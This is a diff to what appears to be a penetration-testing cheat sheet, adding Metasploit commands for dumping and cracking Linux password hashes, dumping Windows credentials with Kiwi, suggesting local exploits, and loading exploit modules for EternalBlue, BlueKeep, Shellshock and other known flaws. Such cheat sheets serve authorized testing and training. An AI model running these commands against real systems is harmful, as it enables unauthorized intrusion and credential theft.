@@ -763,17 +763,28 @@ set payload windows/meterpreter/reverse_tcp
 Few more Post Exploitation tricks:
 
 ```
-use post/linux/gather/hashdump
+msf > use post/linux/gather/hashdump
 set SESSION 1
 exploit
 ```
 
 ```
-use auxiliary/analyze/crack_linux
+msf > use auxiliary/analyze/crack_linux
 set SHA512 true
 run
 ```
 
+```
+msf > use post/multi/recon/local_exploit_suggester
+```
+
+Credential Dumping using Kiwi (MimiKatz alternative)
+```
+meterpreter> load kiwi
+meterpreter> creds_all
+meterpreter> lsa_dump_sam
+meterpreter> lsa_dump_secrets
+```
 
 
 ## 4. Privilege Escalation
@@ -827,6 +838,23 @@ crontab -l
 ```
 
 
+Common simple Exploits
+```
+# SMBv1 EternalBlue
+msf > use exploit/windows/smb/ms17_010_eternalblue
+
+# RDP BlueKeep
+msf > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+# BadBlue 2.72b
+msf > use exploit/windows/http/badblue_passthru
+
+# Linux Shellshock
+msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+# MsHTA vuln
+msf > use exploit/windows/misc/hta_server
+```
 
 
 
